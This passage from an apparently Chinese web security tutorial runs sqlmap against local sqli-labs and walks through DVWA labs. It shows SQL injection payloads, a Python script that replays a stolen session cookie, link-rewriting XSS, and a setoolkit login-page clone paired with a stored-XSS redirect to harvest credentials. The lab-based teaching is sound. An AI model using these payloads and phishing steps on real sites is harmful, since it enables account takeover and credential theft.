[19:56:11] [INFO] testing if GET parameter 'id' is dynamic                                                                                                
[19:56:13] [INFO] GET parameter 'id' appears to be dynamic                                                                                                
[19:56:15] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')                                       
[19:56:17] [INFO] heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks                            
[19:56:17] [INFO] testing for SQL injection on GET parameter 'id'                                                                                         
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y                                          
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y                           
[19:56:17] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'                                                                              
[19:56:44] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'                                                                      
[19:56:46] [WARNING] reflective value(s) found and filtering out                                                                                          
[19:56:48] [INFO] testing 'Generic inline queries'                                                                                                        
[19:56:50] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'                                                              
[19:58:35] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'                                                               
[20:00:11] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'                                                         
[20:01:57] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'                                                  
[20:02:52] [INFO] GET parameter 'id' appears to be 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause' injectable (with --strin
g="Login")                                                                                                                                                
[20:02:52] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'                                   
[20:02:54] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'                                                        
[20:02:56] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'                                               
[20:02:58] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'                                                                    
[20:03:00] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'                                       
[20:03:02] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'                                                            
[20:03:04] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'                                             
[20:03:06] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'                                              
[20:03:08] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'                                      
[20:03:10] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'                                       
[20:03:12] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'                                         
[20:03:14] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'                                          
[20:03:16] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'                                             
[20:03:18] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'                                                                  
[20:03:20] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'                                                                         
[20:03:22] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'                                                                   
[20:03:24] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'                                                                
[20:03:24] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'                                                                            
[20:03:24] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'                                                                    
[20:03:24] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'                                                                          
[20:03:24] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'                                                                      
[20:03:24] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'                                                                   
[20:03:24] [INFO] testing 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (BIGINT UNSIGNED)'                                                        
[20:03:26] [INFO] testing 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (EXP)'                                                                    
[20:03:28] [INFO] testing 'MySQL >= 5.7.8 error-based - ORDER BY, GROUP BY clause (JSON_KEYS)'                                                            
[20:03:30] [INFO] testing 'MySQL >= 5.0 error-based - ORDER BY, GROUP BY clause (FLOOR)'                                                                  
[20:03:32] [INFO] testing 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (EXTRACTVALUE)'                                                           
[20:03:34] [INFO] testing 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (UPDATEXML)'                                                              
[20:03:36] [INFO] testing 'MySQL >= 4.1 error-based - ORDER BY, GROUP BY clause (FLOOR)'                                                                  
[20:03:38] [INFO] testing 'MySQL inline queries'                                                                                                          
[20:03:40] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'                                                                                     
[20:03:42] [INFO] testing 'MySQL >= 5.0.12 stacked queries'                                                                                               
[20:03:44] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'                                                                       
[20:03:47] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'                                                                                 
[20:03:49] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'                                                                        
[20:03:51] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'                                                                                  
[20:03:53] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'                                                                            
[20:03:55] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP)'                                                                             
[20:03:57] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP)'                                                                                  
[20:03:59] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP)'                                                                                   
[20:04:01] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP - comment)'                                                                        
[20:04:03] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP - comment)'                                                                         
[20:04:05] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP - comment)'                                                                  
[20:04:07] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP - comment)'                                                                   
[20:04:09] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (heavy query)'                                                                             
[20:04:11] [INFO] testing 'MySQL < 5.0.12 OR time-based blind (heavy query)'                                                                              
[20:04:13] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (heavy query - comment)'                                                                   
[20:04:15] [INFO] testing 'MySQL < 5.0.12 OR time-based blind (heavy query - comment)'                                                                    
[20:04:17] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind'                                                                                        
[20:05:19] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 RLIKE time-based blind' injectable                                                    
[20:05:19] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'                                                                                  
[20:05:19] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'                                                                                    
[20:05:19] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found     
[20:06:02] [INFO] target URL appears to be UNION injectable with 3 columns                                                                                
[20:06:16] [INFO] GET parameter 'id' is 'MySQL UNION query (NULL) - 1 to 20 columns' injectable                                                           
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N                                                                
sqlmap identified the following injection point(s) with a total of 268 HTTP(s) requests:                                                                  
---                                                                                                                                                       
Parameter: id (GET)                                                                                                                                       
    Type: boolean-based blind                                                                                                                             
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause                                                                   
    Payload: id=1' RLIKE (SELECT (CASE WHEN (3231=3231) THEN 1 ELSE 0x28 END))-- JwBt                                                                     
                                                                                                                                                          
    Type: time-based blind                                                                                                                                
    Title: MySQL >= 5.0.12 RLIKE time-based blind                                                                                                         
    Payload: id=1' RLIKE SLEEP(5)-- TZbF                                                                                                                  
                                                                                                                                                          
    Type: UNION query                                                                                                                                     
    Title: MySQL UNION query (NULL) - 3 columns                                                                                                           
    Payload: id=-6337' UNION ALL SELECT NULL,CONCAT(0x7178767871,0x635a545a4877775a7649456c7a576d4d4679465050687049475a41766e536161616375704570704c,0x716b
717871),NULL#                                                                                                                                             
---                                                                                                                                                       
[20:06:18] [INFO] the back-end DBMS is MySQL                                                                                                              
[20:06:28] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'                          
back-end DBMS: MySQL >= 5.0.12                                                                                                                            
[20:06:28] [INFO] fetching database names                                                                                                                 
[20:06:30] [WARNING] the SQL query provided does not return any output                                                                                    
[20:06:30] [INFO] fetching number of databases                                                                                                            
[20:06:30] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval                               
[20:06:30] [INFO] retrieved:                                                                                                                              
[20:06:36] [INFO] retrieved:                                                                                                                              
[20:06:36] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions       
                                                                                                                                                          
[20:06:42] [ERROR] unable to retrieve the number of databases                                                                                             
[20:06:42] [INFO] falling back to current database                                                                                                        
[20:06:42] [INFO] fetching current database                                                                                                               
available databases [1]:                                                                                                                                  
[*] security                                                                                                                                              
                                                                                                                                                          
[20:06:44] [INFO] fetched data logged to text files under 'XXXX\sqlmap\output\127.0.0.1'                                         
                                                                                                                                                          
[*] ending @ 20:06:44 /2020-03-12/                                                                                                                        
                                                                                                                                                          
                                                                                                                                                          
123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127
```

### 3.绕过去除空格的SQL注入

编码：
hex，urlencode等。

| 符号 | URL编码 |
| ---- | ------- |
| 空格 | %20     |
| TAB  | %09     |

更多URL编码可查看https://www.w3school.com.cn/tags/html_ref_urlencode.html。
访问[http://127.0.0.1/sqli-labs/Less-26/?id=1’ --+](http://127.0.0.1/sqli-labs/Less-26/?id=1' -- )，显示：
![SQL注入 绕过 空格](https://img-blog.csdnimg.cn/20200313142115140.png#pic_center?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0NVRkVFQ1I=,size_16,color_FFFFFF,t_70)
显然，此时未正常访问。

#### sqlmap安全测试

```shell
python sqlmap.py -u 127.0.0.1/sqli-labs/Less-26/?id=1 --hex --dbms=mysql --batch
1
```

打印

```shell
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.4.2.31#dev}
|_ -| . [.]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 20:05:31 /2020-03-12/

[20:05:32] [INFO] testing connection to the target URL
[20:05:34] [INFO] checking if the target is protected by some kind of WAF/IPS
[20:05:36] [INFO] testing if the target URL content is stable
[20:05:38] [INFO] target URL content is stable
[20:05:38] [INFO] testing if GET parameter 'id' is dynamic
[20:05:40] [INFO] GET parameter 'id' appears to be dynamic
[20:05:42] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
[20:05:44] [INFO] heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks
[20:05:44] [INFO] testing for SQL injection on GET parameter 'id'
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[20:05:44] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[20:06:06] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[20:06:10] [INFO] testing 'Generic inline queries'
[20:06:12] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[20:08:04] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[20:08:06] [WARNING] reflective value(s) found and filtering out
[20:09:39] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[20:11:33] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[20:13:59] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[20:16:54] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[20:20:13] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[20:23:18] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[20:26:29] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)'
[20:29:46] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)'
[09:31:37] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
[09:31:41] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
[09:31:41] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
[09:31:46] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
[09:31:46] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
[09:31:50] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
[09:31:50] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[09:31:58] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[09:31:58] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[09:31:58] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[09:31:58] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
[09:33:36] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
[09:33:36] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[09:35:21] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[09:37:07] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[09:38:56] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[09:40:42] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[09:42:28] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[09:44:13] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[09:45:59] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[09:47:45] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[09:49:30] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[09:51:16] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[09:53:02] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[09:54:47] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[09:56:33] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[09:58:18] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[09:59:07] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[10:00:20] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[10:00:22] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[10:00:24] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[10:00:27] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[10:00:29] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[10:00:31] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[10:00:33] [INFO] testing 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (BIGINT UNSIGNED)'
[10:00:37] [INFO] testing 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (EXP)'
[10:00:41] [INFO] testing 'MySQL >= 5.7.8 error-based - ORDER BY, GROUP BY clause (JSON_KEYS)'
[10:00:45] [INFO] testing 'MySQL >= 5.0 error-based - ORDER BY, GROUP BY clause (FLOOR)'
[10:00:49] [INFO] testing 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (EXTRACTVALUE)'
[10:00:53] [INFO] testing 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (UPDATEXML)'
[10:00:57] [INFO] testing 'MySQL >= 4.1 error-based - ORDER BY, GROUP BY clause (FLOOR)'
[10:01:01] [INFO] testing 'MySQL inline queries'
[10:01:03] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[10:01:52] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[10:03:09] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[10:03:58] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[10:05:15] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
[10:06:04] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
[10:07:23] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[10:09:09] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP)'
[10:10:48] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP)'
[10:12:34] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP)'
[10:14:13] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP - comment)'
[10:15:20] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP - comment)'
[10:16:27] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP - comment)'
[10:17:34] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP - comment)'
[10:18:42] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (heavy query)'
[10:20:27] [INFO] testing 'MySQL < 5.0.12 OR time-based blind (heavy query)'
[10:22:07] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (heavy query - comment)'
[10:23:16] [INFO] testing 'MySQL < 5.0.12 OR time-based blind (heavy query - comment)'
[10:24:25] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind'
[10:26:05] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (comment)'
[10:27:12] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP)'
[10:28:52] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP - comment)'
[10:29:59] [INFO] testing 'MySQL AND time-based blind (ELT)'
[10:31:45] [INFO] testing 'MySQL OR time-based blind (ELT)'
[10:33:24] [INFO] testing 'MySQL AND time-based blind (ELT - comment)'
[10:34:31] [INFO] testing 'MySQL OR time-based blind (ELT - comment)'
[10:35:38] [INFO] testing 'MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)'
[10:36:51] [INFO] testing 'MySQL >= 5.1 time-based blind (heavy query - comment) - PROCEDURE ANALYSE (EXTRACTVALUE)'
[10:37:34] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace'
[10:37:36] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)'
[10:37:38] [INFO] testing 'MySQL < 5.0.12 time-based blind - Parameter replace (heavy queries)'
[10:37:40] [INFO] testing 'MySQL time-based blind - Parameter replace (bool)'
[10:37:42] [INFO] testing 'MySQL time-based blind - Parameter replace (ELT)'
[10:37:44] [INFO] testing 'MySQL time-based blind - Parameter replace (MAKE_SET)'
[10:37:46] [INFO] testing 'MySQL >= 5.0.12 time-based blind - ORDER BY, GROUP BY clause'
[10:37:50] [INFO] testing 'MySQL < 5.0.12 time-based blind - ORDER BY, GROUP BY clause (heavy query)'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
[10:37:54] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[10:38:10] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
[10:40:08] [INFO] testing 'MySQL UNION query (random number) - 1 to 10 columns'
[10:42:06] [WARNING] GET parameter 'id' does not seem to be injectable
[10:42:06] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. As heuristic test turned out positive you are strongly advised to continue on with the tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'

[*] ending @ 10:42:06 /2020-03-13/


123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123
```

说明：
有时候字符编码的问题，可能导致数据丢失，可以使用**hex参数**来避免。

## 二、XSS跨站脚本

### 1.XSS漏洞介绍

跨站脚本攻击(**Cross Site Scripting**)：
为了不和层叠样式表(Cascading Style Sheets)的缩写混淆，故将跨站脚本攻击缩写为XSS。
恶意攻击者往web页面里插入恶意script代码，当用户浏览该页时，嵌入其中web里面的script代码会被执行，从而达到恶意攻击用户的目的。
攻击的简单过程如下：
![XSS攻击简单原理](https://img-blog.csdnimg.cn/20200313142241248.png#pic_center?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0NVRkVFQ1I=,size_16,color_FFFFFF,t_70)

### 2.cookie介绍

cookie是在HTTP协议下，服务器或脚本可以维护客户工作站上信息的一种方式。cookie是由web服务器保存在用户浏览器(客户端)上的小文本文件，它包含有关用户的信息。
**Cookie的工作原理：**
由于HTTP是一种无状态的协议，服务器单从网络连接上无从知道客户身份。怎么办呢？就给客户端们颁发一个通行证吧，每人一个，无论谁访问都必须携带自己通行证。这样服务器就能从通行证上确认客户身份了。

### 3.XSS分类

#### 反射型XSS

反射型XSS又称**非持久性**XSS，这种攻击往往具有**一次性**。
攻击者通过**邮件**等形式将包含XSS代码的链接发送给正常用户，当用户点击时，服务器接受该用户的请求并进行处理，然后把带有XSS的代码发送给用户，用户浏览器解析执行代码，触发XSS漏洞。
反射型测试：
![XSS reflected test](https://img-blog.csdnimg.cn/20200313142316233.gif#pic_center)
显然，可以很容易地得到cookie。

#### 存储型XSS

存储型XSS又称**持久型**XSS，攻击脚本存储在目标服务器的数据库中，具有**更强的隐蔽性**。
攻击者在**论坛、博客、留言板**中，发帖的过程中嵌入XSS攻击代码，帖子被目标服务器存储在数据库中，当用户进行正常访问时，触发XSS代码。
存储型测试：
![XSS stored test](https://img-blog.csdnimg.cn/20200313142339309.gif#pic_center)

#### DOM型XSS

DOM型XSS（DOM全称Document Object Model），使用**DOM动态访问**更新文档的**内容、结构及样式**。
服务器响应不会处理攻击者脚本，而是用户浏览器处理这个响应时，DOM对象就会处理XSS代码，触发XSS漏洞。
DOM型测试：
![XSS DOM test](https://img-blog.csdnimg.cn/20200313142405728.gif#pic_center)

### 4.通过Python利用cookie会话劫持

将得到的cookie加入请求头，用Python模拟访问：

```python
import requests


headers = {
    'Cookie':'security=low; PHPSESSID=a3j2dd4aagnki7t47s2m2gjel3'
}

url = 'http://127.0.0.1/dvwa/index.php'
html = requests.get(url, headers = headers).text

with open('dvwa.html','w') as f:
    f.write(html)
123456789101112
```

用浏览器打开得到的HTML文件，会看到：
![XSS Python cookie test](https://img-blog.csdnimg.cn/20200313142427757.png#pic_center?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0NVRkVFQ1I=,size_16,color_FFFFFF,t_70)
显然得到了主要的数据，只是没有样式，如果不加cookie是得不到的。
劫持会话后可以进行的操作：

- 获取页面数据
- 劫持前端逻辑
- 发送请求
- 偷取用户资料
- 偷取用户密码和登录状态

## 三、XSS篡改网页链接和盗取用户信息

### 1.XSS篡改网页链接

下列JS代码可以修改网页的链接：

```javascript
<script>
window.onload = function(){
    var link = document.getElementsByTagName("a");
    for(j=0;j<link.length;j++){
        link[j].href = "http://www.baidu.com";
    }
}
</script>
12345678
```

测试如下：



<iframe id="wrajLLWJ-1584080737629" src="https://player.youku.com/embed/XNDU4NTkwNzAxMg==" allowfullscreen="true" data-mediaembed="youku" style="box-sizing: border-box; outline: 0px; margin: 0px; padding: 0px; font-weight: normal; font-family: &quot;Microsoft YaHei&quot;, &quot;SF Pro Display&quot;, Roboto, Noto, Arial, &quot;PingFang SC&quot;, sans-serif; overflow-wrap: break-word; display: block; width: 660px; height: 330px;"></iframe>

XSS distortlink test


显然，所有的友情链接都被篡改，改成了攻击者希望访问的链。
有许多微博或博客刷流量可能就是运用了该原理。



#### 使用beef-xss生成恶意链接

示例如下：



<iframe id="Y68FbMYW-1584080795622" src="https://player.youku.com/embed/XNDU4NTkwODU2OA==" allowfullscreen="true" data-mediaembed="youku" style="box-sizing: border-box; outline: 0px; margin: 0px; padding: 0px; font-weight: normal; font-family: &quot;Microsoft YaHei&quot;, &quot;SF Pro Display&quot;, Roboto, Noto, Arial, &quot;PingFang SC&quot;, sans-serif; overflow-wrap: break-word; display: block; width: 660px; height: 330px;"></iframe>

XSS beef-xss test



### 2.XSS盗取用户信息原理

克隆网站登录页面，利用**存储XSS**设置跳转代码，如果用户访问即跳转到克隆网站的登录页面，用户输入登录，账号和密码被存储。
简单原理如下：
![XSS 盗取客户信息原理](https://img-blog.csdnimg.cn/2020031314291560.png#pic_center?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0NVRkVFQ1I=,size_16,color_FFFFFF,t_70)

#### setoolkit工具克隆网站

过程如下：

- 在kali终端中输入setoolkit

  - 社会工程攻击>1
  - 网站攻击>2
  - 凭据收集攻击>3
  - root网站克隆>2

- 存储XSS跳转克隆网站

- 在DVWA中XSS(Stored)中执行

  ```javascript
  <script>window.location = "http://192.168.xxx.xxx/";</script>
  1
  ```

setoolkit工具进行克隆示例如下：



<iframe id="0AT90nb9-1584080865831" src="https://player.youku.com/embed/XNDU4NTkxMDA1Ng==" allowfullscreen="true" data-mediaembed="youku" style="box-sizing: border-box; outline: 0px; margin: 0px; padding: 0px; font-weight: normal; font-family: &quot;Microsoft YaHei&quot;, &quot;SF Pro Display&quot;, Roboto, Noto, Arial, &quot;PingFang SC&quot;, sans-serif; overflow-wrap: break-word; display: block; width: 660px; height: 330px;"></iframe>

XSS setoolkit test



## 四、XSS攻击

### 1.实验环境介绍

地址：
https://xss-quiz.int21h.jp/
网页如下：
![xss-quiz网页](https://img-blog.csdnimg.cn/20200313131353585.png#pic_center?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0NVRkVFQ1I=,size_16,color_FFFFFF,t_70)

### 2.探测XSS过程：

- 构造一个不会被识别为恶意代码的字符串提交到页面中
- 使用浏览器审查工具进行代码审查，寻找构造的字符串是否在页面中显示

### 3.闭合文本标签利用XSS

原理是闭合标签。

#### 简单的payload

示例如下：

```javascript
<script>alert(document.domain);</script>
1
```

#### 闭合标签的payload

示例如下：

```javascript
"</b><script>alert(document.domain);</script>
1
```

对简单的payload和闭合标签的payload进行测试如下：
![XSS attack tag test](https://img-blog.csdnimg.cn/20200313142957207.gif#pic_center)

### 4.配置Chrome关闭XSS-Auditor

在访问https://xss-quiz.int21h.jp/进行测试时可能会出现下图情况：
![chrome xss-auditor](https://img-blog.csdnimg.cn/20200313140229330.png#pic_center?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0NVRkVFQ1I=,size_16,color_FFFFFF,t_70)
解决办法：
Chrome配置`--args --disable-xss-auditor`，具体如下：
在桌面重新新建一个Chrome的快捷方式，右键点击属性，设置目标，后加参数`--args --disable-xss-auditor`，确定保存，如下：
